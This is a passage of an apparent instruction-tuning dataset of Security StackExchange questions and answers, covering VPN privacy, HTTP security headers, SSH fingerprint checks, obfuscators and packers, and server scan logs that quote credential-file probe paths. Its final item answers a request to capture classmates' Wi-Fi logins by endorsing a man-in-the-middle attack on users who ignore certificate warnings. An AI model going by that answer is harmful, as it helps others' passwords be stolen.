      "answer": "Type typical use of meta data in .NET assemblies is documented here\nMetadata describes every type and member defined in your code in a language-neutral manner. Metadata stores the following information:\n\nDescription of the assembly.\nIdentity (name, version, culture, public key)\nThe types that are exported.\nOther assemblies that this assembly depends on\nSecurity permissions needed to run.\nDescription of types.\nName, visibility, base class, and interfaces implemented.\nMembers (methods, fields, properties, events, nested types).\nAttributes\nAdditional descriptive elements that modify types and members.\n\nIt is common for .NET obfuscators to modify this metadata to increase the complexity of reverse engineering.\nConfuserEx uses many different techniques for .NET obfsucation. The most basic for preventing opening with IlDasm is applying an attribute \"SuppressIldasmAttribute\" to the assembly. However nearly all modern decompilers will ignore this attribute, it doesn't add meaningful protection on its own.\nIn relation to metadata ConfuserEx also uses \"Invalid Metadata Protection\" where invalid data is added to the meta data, which can prevent older decompilers opening the assembly but modern decompilers already work around this protection.\nFull list of protections ConfuserEx uses is documented here"
    }
  },
  {
    "instruction": "Please answer this question: Is a SSTP-VPN connection enough to hide my internet traffic?\nI am currently renting an apartment with shared guest internet and I don't have access to the router.\nFor several reasons (mostly privacy), I don't want others in my apartment to see what I am doing online. \nI have purchased a VPN-license from a third-party which provides reliable PPTP, SSTP and OpenVPN vpn. \nThis question is partly divided into two things:\n\nIs it possible for other people (in my apartment and network provider) to see what I am doing online when I have SSTP-vpn enabled?\nDo I need to do extra steps to enhance my privacy at home?",
    "context": "",
    "output": "If you use a VPN which originates at your computer (no matter of PPTP, SSTP or OpenVPN) it will - if properly implemented - protect your traffic against sniffing by anybody on the network path between your computer and the VPN endpoint of your VPN provider. Since this VPN endpoint is somewhere on the internet for the kind of VPN you bought, it will protect your traffic details from getting sniffed by others using the same shared internet, the owner of the shared internet access and also your direct internet provider for the internet access.\nBut note that to achieve this kind of protection all data must go through the VPN. It is a common misconfiguration that DNS traffic and/or IPv6 traffic does not go through the VPN. There are several sites which let you check for such leaks like check.ipredator.se.\nAlso note that even if you use a VPN others can still see traffic patterns, i.e. amount of data transferred and timing. From that they might conclude activities, like that you watch a video or do large up- or downloads.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Is a SSTP-VPN connection enough to hide my internet traffic?\nI am currently renting an apartment with shared guest internet and I don't have access to the router.\nFor several reasons (mostly privacy), I don't want others in my apartment to see what I am doing online. \nI have purchased a VPN-license from a third-party which provides reliable PPTP, SSTP and OpenVPN vpn. \nThis question is partly divided into two things:\n\nIs it possible for other people (in my apartment and network provider) to see what I am doing online when I have SSTP-vpn enabled?\nDo I need to do extra steps to enhance my privacy at home?",
      "answer": "If you use a VPN which originates at your computer (no matter of PPTP, SSTP or OpenVPN) it will - if properly implemented - protect your traffic against sniffing by anybody on the network path between your computer and the VPN endpoint of your VPN provider. Since this VPN endpoint is somewhere on the internet for the kind of VPN you bought, it will protect your traffic details from getting sniffed by others using the same shared internet, the owner of the shared internet access and also your direct internet provider for the internet access.\nBut note that to achieve this kind of protection all data must go through the VPN. It is a common misconfiguration that DNS traffic and/or IPv6 traffic does not go through the VPN. There are several sites which let you check for such leaks like check.ipredator.se.\nAlso note that even if you use a VPN others can still see traffic patterns, i.e. amount of data transferred and timing. From that they might conclude activities, like that you watch a video or do large up- or downloads."
    }
  },
  {
    "instruction": "HTTP Security header implementation\nDoes any one know if:\n\nX-Frame-Options \nX-XSS-Protection \nX-Content-Type-Options\nContent-Security-Policy\n\nare for HTTP and:\n\nStrict-Transport-Security\nPublic-Key-Pins\n\nare for HTTPS?\nWhat I mean is that if I have a blog which serves pages on HTTP and has no HTTPS redirection, then only the first 4 headers are necessary. If I host it on HTTPS, only then the remaining 2 headers are necessary? \nOr is it that they are required no matter how I host the blog?",
    "context": "",
    "output": "If I host it on HTTPS, only then the remaining 2 headers are necessary? \n\nNo, that's not enough. Headers aren't mutually exclusive for HTTP or HTTPS.\nHTTPS doesn't eliminate the vulnerabilities that some of the headers are meant to protect you against. \nE.g., the X-Frame-Optionsheader prevents cross-origin framing to stop clickjacking attacks. This risk is unrelated to an encrypted connection and makes sense for sites served over HTTP and HTTPS likewise.\nAlso, there are no \"HTTPS headers\", it's just that HSTS (Strict-Transport-Security) and HPKP (Public-Key-Pins) are HTTP headers that specifically instruct the browser how to behave for HTTPS connections.\n\n[ ...] if I have a blog which serves pages on HTTP and has no HTTPS redirection, then only the first 4 headers are necessary.\n\nSince HSTS instructs the browser to only connect over HTTPS for a given time and HPKP specifies public key hashes for the certificates that the browser should accept, you're correct that these two headers wouldn't make sense for a plain HTTP website. However, depending on your application, just setting the headers from your list won't guarantee you a secure website. I'd recommend you study each header's purpose and other possible measures to protect your site.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "HTTP Security header implementation\nDoes any one know if:\n\nX-Frame-Options \nX-XSS-Protection \nX-Content-Type-Options\nContent-Security-Policy\n\nare for HTTP and:\n\nStrict-Transport-Security\nPublic-Key-Pins\n\nare for HTTPS?\nWhat I mean is that if I have a blog which serves pages on HTTP and has no HTTPS redirection, then only the first 4 headers are necessary. If I host it on HTTPS, only then the remaining 2 headers are necessary? \nOr is it that they are required no matter how I host the blog?",
      "answer": "If I host it on HTTPS, only then the remaining 2 headers are necessary? \n\nNo, that's not enough. Headers aren't mutually exclusive for HTTP or HTTPS.\nHTTPS doesn't eliminate the vulnerabilities that some of the headers are meant to protect you against. \nE.g., the X-Frame-Optionsheader prevents cross-origin framing to stop clickjacking attacks. This risk is unrelated to an encrypted connection and makes sense for sites served over HTTP and HTTPS likewise.\nAlso, there are no \"HTTPS headers\", it's just that HSTS (Strict-Transport-Security) and HPKP (Public-Key-Pins) are HTTP headers that specifically instruct the browser how to behave for HTTPS connections.\n\n[ ...] if I have a blog which serves pages on HTTP and has no HTTPS redirection, then only the first 4 headers are necessary.\n\nSince HSTS instructs the browser to only connect over HTTPS for a given time and HPKP specifies public key hashes for the certificates that the browser should accept, you're correct that these two headers wouldn't make sense for a plain HTTP website. However, depending on your application, just setting the headers from your list won't guarantee you a secure website. I'd recommend you study each header's purpose and other possible measures to protect your site."
    }
  },
  {
    "instruction": "Answer this question:\n\nHow to properly disclose a security vulnerability anonymously?\nLet's say I found a login-bypass/root-backdoor in a software my company uses that gives you root privileges within that software by simply entering a keyboard combination. \nI've reported this within my company and to the company that provides the software but neither really care despite the possibility for major security risks and also legal risks due to this (the software reports production numbers and makes calculations for BI etc.).\nI tried the combination with other software products from the same vendor and these also have the same backdoor. How should one proceed in disclosing this anonymously (as I know other companies that use this software) so it won't have consequences for myself which I fear because we have ongoing business relationships with that vendor.",
    "context": "",
    "output": "A: Trying to go trough a third-party might help in this case.\nOne of the main company in this area is the zero day initiative. You could probably report your flaw to them or another third-party. Depending on the importance of this flaw, you might receive monetary compensation for reporting the flaw.\nThose company usually have way more connections and leverage than an average independent person.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How to properly disclose a security vulnerability anonymously?\nLet's say I found a login-bypass/root-backdoor in a software my company uses that gives you root privileges within that software by simply entering a keyboard combination. \nI've reported this within my company and to the company that provides the software but neither really care despite the possibility for major security risks and also legal risks due to this (the software reports production numbers and makes calculations for BI etc.).\nI tried the combination with other software products from the same vendor and these also have the same backdoor. How should one proceed in disclosing this anonymously (as I know other companies that use this software) so it won't have consequences for myself which I fear because we have ongoing business relationships with that vendor.",
      "answer": "Trying to go trough a third-party might help in this case.\nOne of the main company in this area is the zero day initiative. You could probably report your flaw to them or another third-party. Depending on the importance of this flaw, you might receive monetary compensation for reporting the flaw.\nThose company usually have way more connections and leverage than an average independent person."
    }
  },
  {
    "instruction": "Answer the following question:\n\nHow to explain to a customer that spamfilters don't catch everything\nI used to work in a small office which provided basic desktop support for users. \nOne day I had to answer a call from a very angry customer and he asked for my boss. He wanted to know how could one email slip through their spam filter/network-based antivirus software (if there is such a thing, that's what he claimed), and the attachment got filtered/caught by the antivirus software on his desktop.\nTill I could reach my boss I had to tell him that a spam filter is not flawless/perfect and sometimes one email mange to pass. \nAlso to support my claims, I explained to him Gmail themselves allowed that email to attachment despite that his antivirus software had detected and removed it.\nWas my explanation right? How would a security expert deal with this situation?",
    "context": "",
    "output": "The main function of a SPAM filter is to block anything that looks like a SPAM. The objective of an anti-virus software is to detect and remove anything that possess the signature of a virus (worms included) based on the virus definition installed. Both programs work differently based on different heuristics.\nAn email that doesn't look like a SPAM may contain a virus. You can't realistically expect a SPAM filter to perform the job of an anti-virus since that is not its primary task. And even with an anti-virus software installed, it is never a foolproof method to eliminate all kinds of virus.\nIf your SPAM filter keeps a log of the emails that have been blocked, then maybe you can appease your client a bit by showing the unseen good work it has done.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How to explain to a customer that spamfilters don't catch everything\nI used to work in a small office which provided basic desktop support for users. \nOne day I had to answer a call from a very angry customer and he asked for my boss. He wanted to know how could one email slip through their spam filter/network-based antivirus software (if there is such a thing, that's what he claimed), and the attachment got filtered/caught by the antivirus software on his desktop.\nTill I could reach my boss I had to tell him that a spam filter is not flawless/perfect and sometimes one email mange to pass. \nAlso to support my claims, I explained to him Gmail themselves allowed that email to attachment despite that his antivirus software had detected and removed it.\nWas my explanation right? How would a security expert deal with this situation?",
      "answer": "The main function of a SPAM filter is to block anything that looks like a SPAM. The objective of an anti-virus software is to detect and remove anything that possess the signature of a virus (worms included) based on the virus definition installed. Both programs work differently based on different heuristics.\nAn email that doesn't look like a SPAM may contain a virus. You can't realistically expect a SPAM filter to perform the job of an anti-virus since that is not its primary task. And even with an anti-virus software installed, it is never a foolproof method to eliminate all kinds of virus.\nIf your SPAM filter keeps a log of the emails that have been blocked, then maybe you can appease your client a bit by showing the unseen good work it has done."
    }
  },
  {
    "instruction": "Answer the following question:\n\nCross-referencing object fields\nI'ld like to see which functions are operating with certain object's fields that I already processed, meaning I created the structure and assigned it to the correct places in the functions in IDA, without having to run a dynamic debugger. (for example, I would like to see a list of the functions accessing/writing/reading the Foo data field of the Bar object), but as far as I know it's not implemented in IDA.",
    "context": "",
    "output": "IDA has been able to show cross-references to structure members since version 6.2:",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Cross-referencing object fields\nI'ld like to see which functions are operating with certain object's fields that I already processed, meaning I created the structure and assigned it to the correct places in the functions in IDA, without having to run a dynamic debugger. (for example, I would like to see a list of the functions accessing/writing/reading the Foo data field of the Bar object), but as far as I know it's not implemented in IDA.",
      "answer": "IDA has been able to show cross-references to structure members since version 6.2:"
    }
  },
  {
    "instruction": "Answer the question below.\nGiskismet query, how to select specific data?\nI\u2019m basically trying to get some stats from my war drive kismet database using giskismet but I\u2019m finding it difficult to get specific data.\nThings I'm trying to do:\nCount how many wireless BSSID\u2019s there are in total\n\nHow many are WEP/WAP, using to calculate what present are WEP/WPA\n\nGet the make of the wireless eg netgear and count how many are WEP/WPA\n\nIs this possible to do with giskismet? iv tried \u201cselect BSSID from wireless\u201d \u2013o test.xml but I get errors. The same happens if I try anything other than \u201cselect*from wireless\u201d. But this outputs everything to one massive xml file which is incredibly hard for me to search through as I don\u2019t know much xml.\nDoes anyone have any ideas how I could get data from the wireless.dbl, it\u2019s in sqllite I think if that helps.",
    "context": "",
    "output": "Analysing kismet XML is the best way to go on this one.  There's a script that I've knocked up which should do most of what you're looking for, but feel free to look through it and modify for your purposes.\nI'm planning to put it in a github repo at some point, but it needs cleaned up a bit before that.  That said it should work ok for you at the moment, so here's a link to the code\nyou'll need to get ruby installed and working, along with the nokogiri and ruport gems.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Giskismet query, how to select specific data?\nI\u2019m basically trying to get some stats from my war drive kismet database using giskismet but I\u2019m finding it difficult to get specific data.\nThings I'm trying to do:\nCount how many wireless BSSID\u2019s there are in total\n\nHow many are WEP/WAP, using to calculate what present are WEP/WPA\n\nGet the make of the wireless eg netgear and count how many are WEP/WPA\n\nIs this possible to do with giskismet? iv tried \u201cselect BSSID from wireless\u201d \u2013o test.xml but I get errors. The same happens if I try anything other than \u201cselect*from wireless\u201d. But this outputs everything to one massive xml file which is incredibly hard for me to search through as I don\u2019t know much xml.\nDoes anyone have any ideas how I could get data from the wireless.dbl, it\u2019s in sqllite I think if that helps.",
      "answer": "Analysing kismet XML is the best way to go on this one.  There's a script that I've knocked up which should do most of what you're looking for, but feel free to look through it and modify for your purposes.\nI'm planning to put it in a github repo at some point, but it needs cleaned up a bit before that.  That said it should work ok for you at the moment, so here's a link to the code\nyou'll need to get ruby installed and working, along with the nokogiri and ruport gems."
    }
  },
  {
    "instruction": "Answer the question below.\nAre passwords stored in memory safe?\nI just realized that, in any language, when you save a password in a variable, it is stored as plain text in the memory.\nI think the OS does its job and forbids processes from accessing each other's allocated memory. But I also think this is somehow bypassable. So I wonder if it is really safe and if there is a safer way to store passwords to ensure that foreign processes can't access them.\nI didn't specify the OS or the language because my question is quite general. This is rather a computer literacy question than a specific purpose one.",
    "context": "",
    "output": "What language/platform are you using?\nIf it's .NET, check out the PasswordBox control and the SecureString class. \nThe SecureString class represents a way to store the password in memory without making it accessible to anyone - even hackers who sneak peeks at your application's memory.\nThe PasswordBox control is a textbox that incorporates the SecureString, so you can keep the password safe and secure from end-to-end.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Are passwords stored in memory safe?\nI just realized that, in any language, when you save a password in a variable, it is stored as plain text in the memory.\nI think the OS does its job and forbids processes from accessing each other's allocated memory. But I also think this is somehow bypassable. So I wonder if it is really safe and if there is a safer way to store passwords to ensure that foreign processes can't access them.\nI didn't specify the OS or the language because my question is quite general. This is rather a computer literacy question than a specific purpose one.",
      "answer": "What language/platform are you using?\nIf it's .NET, check out the PasswordBox control and the SecureString class. \nThe SecureString class represents a way to store the password in memory without making it accessible to anyone - even hackers who sneak peeks at your application's memory.\nThe PasswordBox control is a textbox that incorporates the SecureString, so you can keep the password safe and secure from end-to-end."
    }
  },
  {
    "instruction": "Please answer this question: Weird popup on Android 'GNUroot Debian' - what could cause it?\nI've got an Android device connected to my TV. The OS itself is of dubious origin, and various tools report it as rooted and unrooted. There's nothing important on its flash memory. Nonetheless, after using GNURoot Debian (think cygwin for android) to do a simple wget, I got this weird popup, see image.\n\nI don't use VNC, and this error puzzles me. Particularly why something would attempt a VNC connection from localhost to localhost. Any ideas?\nEdit: I've used this GNURoot Debian (from official Play Store) for a few hours yesterday - without this odd error. There were no other actions inside it, except a simple wget job.",
    "context": "",
    "output": "I am the creator of GNURoot Debian.  GNURoot Debian does use VNC for providing a graphical desktop if desired.  If you click the Xterm icon (maybe on accident in this case), GNURoot Debian starts a VNC Server and then starts and VNC client to connect to it.  This is the error you get if for some reason the server is not running when the client goes to connect to it.\nCorbin",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Weird popup on Android 'GNUroot Debian' - what could cause it?\nI've got an Android device connected to my TV. The OS itself is of dubious origin, and various tools report it as rooted and unrooted. There's nothing important on its flash memory. Nonetheless, after using GNURoot Debian (think cygwin for android) to do a simple wget, I got this weird popup, see image.\n\nI don't use VNC, and this error puzzles me. Particularly why something would attempt a VNC connection from localhost to localhost. Any ideas?\nEdit: I've used this GNURoot Debian (from official Play Store) for a few hours yesterday - without this odd error. There were no other actions inside it, except a simple wget job.",
      "answer": "I am the creator of GNURoot Debian.  GNURoot Debian does use VNC for providing a graphical desktop if desired.  If you click the Xterm icon (maybe on accident in this case), GNURoot Debian starts a VNC Server and then starts and VNC client to connect to it.  This is the error you get if for some reason the server is not running when the client goes to connect to it.\nCorbin"
    }
  },
  {
    "instruction": "What is the answer to this question - How does the attacker discover our server?\nAs titled, we discovered some unknown IP address is accessing our API Server.\nWe have set up an AWS EC2 instance as an API server. The API server URL is only used in our mobile app.\nHowever, our mobile app has not been released yet and the API server URL is not linked from any public website.\nWe can see the (multiple) attackers are randomly trying the URL path, \ni.e. \n/admin/i18n/readme.txt\n/a2billing/admin/Public/index.php\n/current_config/passwd\n/recordings/\n/.git/objects\n\nHow do they discover our server really?\n\n",
    "context": "",
    "output": "This seems like it is just random scanners on the internet. They just roam around trying different IP adresses and looking for certain folders and files that might indicate vulnerabilities.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How does the attacker discover our server?\nAs titled, we discovered some unknown IP address is accessing our API Server.\nWe have set up an AWS EC2 instance as an API server. The API server URL is only used in our mobile app.\nHowever, our mobile app has not been released yet and the API server URL is not linked from any public website.\nWe can see the (multiple) attackers are randomly trying the URL path, \ni.e. \n/admin/i18n/readme.txt\n/a2billing/admin/Public/index.php\n/current_config/passwd\n/recordings/\n/.git/objects\n\nHow do they discover our server really?",
      "answer": "This seems like it is just random scanners on the internet. They just roam around trying different IP adresses and looking for certain folders and files that might indicate vulnerabilities."
    }
  },
  {
    "instruction": "Answer the question below.\nSpoofing domains in Facebook\nOver this past week my Facebook's timeline have been flooded by people posting \"teenagers sex videos\" and tagging a lot of people. \nIt's common in Facebook to see this kind of malware spreading to people that believe and click on everything, but what I see different this time is that the domain of the \"video\" is apple.com. \nHow is it possible? \nFor example:",
    "context": "",
    "output": "I think the question is \"how such a spoofing possible\"? It's not a question how a domain owner protects it, because you can't control the whole web. The spoof IS a kind of lie, so EVERYTHING is possible here. The purpose is to shock you, so if you will see a BBC or CNN domains under this XXX videos - feel no surprise.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Spoofing domains in Facebook\nOver this past week my Facebook's timeline have been flooded by people posting \"teenagers sex videos\" and tagging a lot of people. \nIt's common in Facebook to see this kind of malware spreading to people that believe and click on everything, but what I see different this time is that the domain of the \"video\" is apple.com. \nHow is it possible? \nFor example:",
      "answer": "I think the question is \"how such a spoofing possible\"? It's not a question how a domain owner protects it, because you can't control the whole web. The spoof IS a kind of lie, so EVERYTHING is possible here. The purpose is to shock you, so if you will see a BBC or CNN domains under this XXX videos - feel no surprise."
    }
  },
  {
    "instruction": "Nessus Default Ports\nWhen scanning with nessus and defining the ports, there is an option where you could simply type \"default\" and nessus will scan certain ports. I was wondering what the ports were? I am assuming the ports are the 100 common ports from nmap?",
    "context": "",
    "output": "Default = All common ports listed in the configuration file (/etc/services).\nExtracted from official nessus documentation page.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Nessus Default Ports\nWhen scanning with nessus and defining the ports, there is an option where you could simply type \"default\" and nessus will scan certain ports. I was wondering what the ports were? I am assuming the ports are the 100 common ports from nmap?",
      "answer": "Default = All common ports listed in the configuration file (/etc/services).\nExtracted from official nessus documentation page."
    }
  },
  {
    "instruction": "Q: Securing Java web services called by web site in DMZ using web services for communication\nSuppose you have an application running Java web services in Apache Axis 2.  Specifically, these are JAX-WS (Java API for XML-Based Web Services).  Currently these web services are on the same Windows Server 2008 server that our web site (web application) runs on.  Our web application, which is running in IIS using PHP uses Curl (PHP library) to request data using JAX-WS web services.  How should we protect these web services from getting called by the general public, so only our web application can only make requests?",
    "context": "",
    "output": " A: You need to block traffic to the port on which your JAX-WS web service is listening from all addresses other than localhost.  You can do this using the Windows Firewall application on Windows, iptables on Linux.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Securing Java web services called by web site in DMZ using web services for communication\nSuppose you have an application running Java web services in Apache Axis 2.  Specifically, these are JAX-WS (Java API for XML-Based Web Services).  Currently these web services are on the same Windows Server 2008 server that our web site (web application) runs on.  Our web application, which is running in IIS using PHP uses Curl (PHP library) to request data using JAX-WS web services.  How should we protect these web services from getting called by the general public, so only our web application can only make requests?",
      "answer": "You need to block traffic to the port on which your JAX-WS web service is listening from all addresses other than localhost.  You can do this using the Windows Firewall application on Windows, iptables on Linux."
    }
  },
  {
    "instruction": "Question: Is possible to deliver a dos attack increasing a database table?\nIf a user through a request can add a record to a table (for each request) is theoretically possible that he could cause a dos attack just increasing the size of a table?",
    "context": "",
    "output": "Answer: Of course. Depending on how the database is configured to handle growth. The database can grow to fill an entire disk or partition, for instance, and that can crash the database, the service, or the entire server.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Is possible to deliver a dos attack increasing a database table?\nIf a user through a request can add a record to a table (for each request) is theoretically possible that he could cause a dos attack just increasing the size of a table?",
      "answer": "Of course. Depending on how the database is configured to handle growth. The database can grow to fill an entire disk or partition, for instance, and that can crash the database, the service, or the entire server."
    }
  },
  {
    "instruction": "Answer the following question:\n\nHow do I know the remote server is genuine the first time I connect with SSH?\nImagine a scenario(don't know if it's possible):\nBefore I connect to my newly-bought VPS for the first time, somebody has been spying on my network connection and trying to employ MITM attack when I try to ssh a server. For the first time of ssh connection, given the server ssh public key fingerprint, how do I know it's the real server I want to connect to? How do you guys ensure this? (Everytime I connect to a new VPS, I type yes.)",
    "context": "",
    "output": "Connect to the server using the administration console from the control panel of the provider, generate the server SSH keys, save the fingerprint. When you connect to it by SSH later, compare the fingerprint with the one you saved before.\nBut the chances of someone spying on you specifically to intercept and change the fingerprint of your recently commissioned are pretty small.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How do I know the remote server is genuine the first time I connect with SSH?\nImagine a scenario(don't know if it's possible):\nBefore I connect to my newly-bought VPS for the first time, somebody has been spying on my network connection and trying to employ MITM attack when I try to ssh a server. For the first time of ssh connection, given the server ssh public key fingerprint, how do I know it's the real server I want to connect to? How do you guys ensure this? (Everytime I connect to a new VPS, I type yes.)",
      "answer": "Connect to the server using the administration console from the control panel of the provider, generate the server SSH keys, save the fingerprint. When you connect to it by SSH later, compare the fingerprint with the one you saved before.\nBut the chances of someone spying on you specifically to intercept and change the fingerprint of your recently commissioned are pretty small."
    }
  },
  {
    "instruction": "Question: Is it possible to turn a computer into a bomb?\nI know this newspaper article sounds absurd.  Even if a machine is compromised we (should) have hardware safe guards in all our devices to prevent the software from damaging the hardware.  But is it possible to make a computer explode or catch fire?   Has this ever been done?",
    "context": "",
    "output": "Answer: In the old days of Linux, when a 14.4k modem was good and 28.8k was a treasure, and downloading slackware required whole nights, I (very young at the time) was rather worried by a small notice of warning relative to setting the frequency of the monitor in the .Xconfig file. A wrong frequency could, apparently, lead to a failure (and/or explosion!) of the monitor. \nI never had the slightest problem with it and don't have idea if it really ever happened. But I am sure that it sounded scary. I think it was in some man pages.\nSee the red box under section 30.3.1.7 for an example.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Is it possible to turn a computer into a bomb?\nI know this newspaper article sounds absurd.  Even if a machine is compromised we (should) have hardware safe guards in all our devices to prevent the software from damaging the hardware.  But is it possible to make a computer explode or catch fire?   Has this ever been done?",
      "answer": "In the old days of Linux, when a 14.4k modem was good and 28.8k was a treasure, and downloading slackware required whole nights, I (very young at the time) was rather worried by a small notice of warning relative to setting the frequency of the monitor in the .Xconfig file. A wrong frequency could, apparently, lead to a failure (and/or explosion!) of the monitor. \nI never had the slightest problem with it and don't have idea if it really ever happened. But I am sure that it sounded scary. I think it was in some man pages.\nSee the red box under section 30.3.1.7 for an example."
    }
  },
  {
    "instruction": "Is there any simple open source Windows packer?\nThere are great questions here about different types of packers and that is very interesting to me.  I would like to try my hand at reverse engineering one.  Since I am very new to this, I would like the source code as well.\nI am hoping that by continuously compiling and recompiling the source, I can learn to match it up in IDA Pro and gain a better understanding of both topics at once.\nI've checked out the source code for UPX but it is very complex as it handles many different platforms and types.  \nIs there an open source code packer that deals exclusively with Windows executables and is very simple to understand?",
    "context": "",
    "output": "SimplePack is simple and open-source (albeit in ASM, not in C)\nSimplePack is not trivial, yet simple enough so that I typically use it myself as a first 'hands-on' for binary packer training.\nalso, my minimalists packers (source/binaries) in python (EP-patcher, compresser, cryptor, dropper, protecter, virtualizer, mutater). No  real use, but made as smallest possible examples for studies.\nFor reference only, PolyEnE is also open-source (in ASM, again), but not very simple - YMMV.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Is there any simple open source Windows packer?\nThere are great questions here about different types of packers and that is very interesting to me.  I would like to try my hand at reverse engineering one.  Since I am very new to this, I would like the source code as well.\nI am hoping that by continuously compiling and recompiling the source, I can learn to match it up in IDA Pro and gain a better understanding of both topics at once.\nI've checked out the source code for UPX but it is very complex as it handles many different platforms and types.  \nIs there an open source code packer that deals exclusively with Windows executables and is very simple to understand?",
      "answer": "SimplePack is simple and open-source (albeit in ASM, not in C)\nSimplePack is not trivial, yet simple enough so that I typically use it myself as a first 'hands-on' for binary packer training.\nalso, my minimalists packers (source/binaries) in python (EP-patcher, compresser, cryptor, dropper, protecter, virtualizer, mutater). No  real use, but made as smallest possible examples for studies.\nFor reference only, PolyEnE is also open-source (in ASM, again), but not very simple - YMMV."
    }
  },
  {
    "instruction": "Can you tell me the answer to: How can I get EAPOL packet's number?\nI need to work with EAPOL packets, and I have to distinguish between first, second, third and fourth... \nIf I'm using WPA2 I can use the first 2 bytes of Key Information field, and I can use Key MIC, Secure, Encrypted Kedy Data... But if I'm using WPA I can't use them because are always settled as zero...\nSo, have you any suggestion to me??",
    "context": "",
    "output": "answer: I solve it for both WPA and WPA2 using MIC_SET, ACK and NONCE fields.\nMIC_SET   |   ACK   |   NONCE   |   Packet Number\n   0      |    1    |     x     |        1\n   1      |    0    |     x     |        2\n   1      |    1    |     x     |        3\n   1      |    0    |     0     |        4\n\nWhere with x I indicate that the NONCE has a value different of 0000000...",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How can I get EAPOL packet's number?\nI need to work with EAPOL packets, and I have to distinguish between first, second, third and fourth... \nIf I'm using WPA2 I can use the first 2 bytes of Key Information field, and I can use Key MIC, Secure, Encrypted Kedy Data... But if I'm using WPA I can't use them because are always settled as zero...\nSo, have you any suggestion to me??",
      "answer": "I solve it for both WPA and WPA2 using MIC_SET, ACK and NONCE fields.\nMIC_SET   |   ACK   |   NONCE   |   Packet Number\n   0      |    1    |     x     |        1\n   1      |    0    |     x     |        2\n   1      |    1    |     x     |        3\n   1      |    0    |     0     |        4\n\nWhere with x I indicate that the NONCE has a value different of 0000000..."
    }
  },
  {
    "instruction": "Can you tell me the answer to: How does \"Somewhere you are\" authentication add further security?\nIn addition to the authentication techniques that are based on \u201csomething you\nhave\u201d, \u201csomething you know\u201d and \u201csomething you are\u201d, authentication techniques that consider \u201csomewhere you are\u201d are also used. Why? Does it add further security?",
    "context": "",
    "output": "answer: Answer was posted as comment. I am claiming no reputation score\n\nFrom a fraud perspective it could help. For example your bank, if you always make payments from country X and all of a sudden they (the bank) see you're making payments from country Y, they could add an extra challenge (SMS code for example) to verify it is most likely you\n\nAnd here is an extra. When you swipe/touch your credit card, the bank knows where the merchant is. Assuming you use your own card yourself (e.g. never lend to your children/partner, which is not that bad of an idea), and assuming you do have a banking app installed, the bank may either push a geolocation request to your phone, or analyse your location history reported by the app (the second being more privacy-invasive).\nThen the bank can compare the approximate distance between POS and mobile device. Precision depends on a number of factors (their mileage may vary), but swiping a card in Bruxelles when the phone is geolocalized in Prague is a red flag!\nMy bank, for example, asks for the second. To collect 24/7 location information.\nThe geolocation criteria is only a feature from the point of view of fraud classification, which is normally scored across several parameters (frequency, amount, merchant category, usage of PIN...).\nWhat can realistically happen is that you may get a phone call \"Hello Mr. Smith, this is Alice from ABC Bank, your account no. ends with #123 and I am calling to report unusual activity with your card\".",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How does \"Somewhere you are\" authentication add further security?\nIn addition to the authentication techniques that are based on \u201csomething you\nhave\u201d, \u201csomething you know\u201d and \u201csomething you are\u201d, authentication techniques that consider \u201csomewhere you are\u201d are also used. Why? Does it add further security?",
      "answer": "Answer was posted as comment. I am claiming no reputation score\n\nFrom a fraud perspective it could help. For example your bank, if you always make payments from country X and all of a sudden they (the bank) see you're making payments from country Y, they could add an extra challenge (SMS code for example) to verify it is most likely you\n\nAnd here is an extra. When you swipe/touch your credit card, the bank knows where the merchant is. Assuming you use your own card yourself (e.g. never lend to your children/partner, which is not that bad of an idea), and assuming you do have a banking app installed, the bank may either push a geolocation request to your phone, or analyse your location history reported by the app (the second being more privacy-invasive).\nThen the bank can compare the approximate distance between POS and mobile device. Precision depends on a number of factors (their mileage may vary), but swiping a card in Bruxelles when the phone is geolocalized in Prague is a red flag!\nMy bank, for example, asks for the second. To collect 24/7 location information.\nThe geolocation criteria is only a feature from the point of view of fraud classification, which is normally scored across several parameters (frequency, amount, merchant category, usage of PIN...).\nWhat can realistically happen is that you may get a phone call \"Hello Mr. Smith, this is Alice from ABC Bank, your account no. ends with #123 and I am calling to report unusual activity with your card\"."
    }
  },
  {
    "instruction": "Question: How to decode traffic on a LAN whose SSL certificates are expired\nWe have a campus Wi-Fi at my university and we authenticate through a log in page which to me seems like we are using a RADIUS server.\nEvery time the page loads my browser warns me that the certificate(s) being used are expired/not valid.\nIs there any way to capturer the authentication data (login and password) off the network and decode it since the SSL certificate(s) is expired?",
    "context": "",
    "output": "Answer: The expired certificate itself wouldn't really allow you to decrypt the data, but it does open up a major \"vulnerability\", albeit it's more of a social one - most users are now accustomed to ignoring certificate warnings from their browsers.  Thus, if you perform a man-in-the-middle attack most users will probably click straight through the certificate warning, allowing you to capture their data.  They probably won't notice that the warning is slightly different from previous ones or that the certificate is different.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
